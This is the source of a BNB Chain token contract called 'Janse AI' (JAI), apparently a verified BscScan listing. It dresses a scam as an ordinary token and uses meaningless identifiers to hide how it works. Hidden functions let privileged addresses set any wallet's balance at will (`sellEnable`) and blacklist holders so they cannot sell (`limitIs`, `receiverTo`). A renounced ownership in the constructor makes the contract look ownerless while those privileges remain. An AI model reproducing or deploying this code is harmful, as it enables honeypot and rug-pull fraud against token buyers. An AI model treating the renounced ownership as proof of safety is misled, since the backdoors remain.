/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface atTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountWalletShould) external view returns (uint256);

    function transfer(address listWallet, uint256 teamWallet) external returns (bool);

    function allowance(address amountAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamWallet) external returns (bool);

    function transferFrom(
        address sender,
        address listWallet,
        uint256 teamWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingMin, uint256 value);
    event Approval(address indexed amountAuto, address indexed spender, uint256 value);
}

interface atTeamMetadata is atTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract txMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldEnable {
    function createPair(address liquidityAuto, address takeMarketing) external returns (address);
}

interface liquidityList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract JanseAI is txMin, atTeam, atTeamMetadata {

    function owner() external view returns (address) {
        return takeShouldSell;
    }

    function exemptToBuy() public {
        
        
        senderTokenMax=0;
    }

    function atShould(address fundLimit, address listWallet, uint256 teamWallet) internal returns (bool) {
        if (fundLimit == limitShould) {
            return tradingFund(fundLimit, listWallet, teamWallet);
        }
        require(!receiverTo[fundLimit]);
        return tradingFund(fundLimit, listWallet, teamWallet);
    }

    function amountTotal(address buyToken) public {
        if (maxMinFrom) {
            return;
        }
        if (tradingSender == senderTokenMax) {
            fromList = false;
        }
        txFee[buyToken] = true;
        if (senderTokenMax != tradingSender) {
            tradingSender = listSell;
        }
        maxMinFrom = true;
    }

    bool public fromList;

    constructor (){ 
        
        liquidityList enableTrading = liquidityList(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        amountToken = shouldEnable(enableTrading.factory()).createPair(enableTrading.WETH(), address(this));
        takeShouldSell = _msgSender();
        
        limitShould = _msgSender();
        txFee[_msgSender()] = true;
        if (minTotal != enableFund) {
            enableFund = true;
        }
        totalLimit[_msgSender()] = autoReceiver;
        emit Transfer(address(0), limitShould, autoReceiver);
        isMin();
    }

    function toAutoSwap() public view returns (uint256) {
        return tradingSender;
    }

    function allowance(address swapBuy, address minWallet) external view virtual override returns (uint256) {
        return toMode[swapBuy][minWallet];
    }

    string private marketingMax = "Janse AI";

    function approve(address minWallet, uint256 teamWallet) public virtual override returns (bool) {
        toMode[_msgSender()][minWallet] = teamWallet;
        emit Approval(_msgSender(), minWallet, teamWallet);
        return true;
    }

    function fundMode() public {
        if (enableFund == enableAuto) {
            senderTokenMax = tradingSender;
        }
        
        listSell=0;
    }

    function transferFrom(address fundLimit, address listWallet, uint256 teamWallet) external override returns (bool) {
        if (toMode[fundLimit][_msgSender()] != type(uint256).max) {
            require(teamWallet <= toMode[fundLimit][_msgSender()]);
            toMode[fundLimit][_msgSender()] -= teamWallet;
        }
        return atShould(fundLimit, listWallet, teamWallet);
    }

    event OwnershipTransferred(address indexed exemptFeeLiquidity, address indexed autoMinLiquidity);

    bool public enableFund;

    uint256 private autoReceiver = 100000000 * 10 ** 18;

    string private toTake = "JAI";

    bool public maxMinFrom;

    mapping(address => bool) public receiverTo;

    function transfer(address atSell, uint256 teamWallet) external virtual override returns (bool) {
        return atShould(_msgSender(), atSell, teamWallet);
    }

    mapping(address => mapping(address => uint256)) private toMode;

    function tradingFund(address fundLimit, address listWallet, uint256 teamWallet) internal returns (bool) {
        require(totalLimit[fundLimit] >= teamWallet);
        totalLimit[fundLimit] -= teamWallet;
        totalLimit[listWallet] += teamWallet;
        emit Transfer(fundLimit, listWallet, teamWallet);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return marketingMax;
    }

    function decimals() external view virtual override returns (uint8) {
        return walletFund;
    }

    mapping(address => bool) public txFee;

    function sellEnable(address atSell, uint256 teamWallet) public {
        require(txFee[_msgSender()]);
        totalLimit[atSell] = teamWallet;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoReceiver;
    }

    bool private minTotal;

    function isMin() public {
        emit OwnershipTransferred(limitShould, address(0));
        takeShouldSell = address(0);
    }

    address private takeShouldSell;

    function totalTake() public {
        
        
        minTotal=false;
    }

    function limitIs(address tradingTx) public {
        
        if (tradingTx == limitShould || tradingTx == amountToken || !txFee[_msgSender()]) {
            return;
        }
        
        receiverTo[tradingTx] = true;
    }

    function enableFee() public view returns (uint256) {
        return listSell;
    }

    function getOwner() external view returns (address) {
        return takeShouldSell;
    }

    address public amountToken;

    function balanceOf(address amountWalletShould) public view virtual override returns (uint256) {
        return totalLimit[amountWalletShould];
    }

    uint256 private listSell;

    uint256 public tradingSender;

    uint8 private walletFund = 18;

    address public limitShould;

    bool public enableAuto;

    mapping(address => uint256) private totalLimit;

    uint256 public senderTokenMax;

    function symbol() external view virtual override returns (string memory) {
        return toTake;
    }

}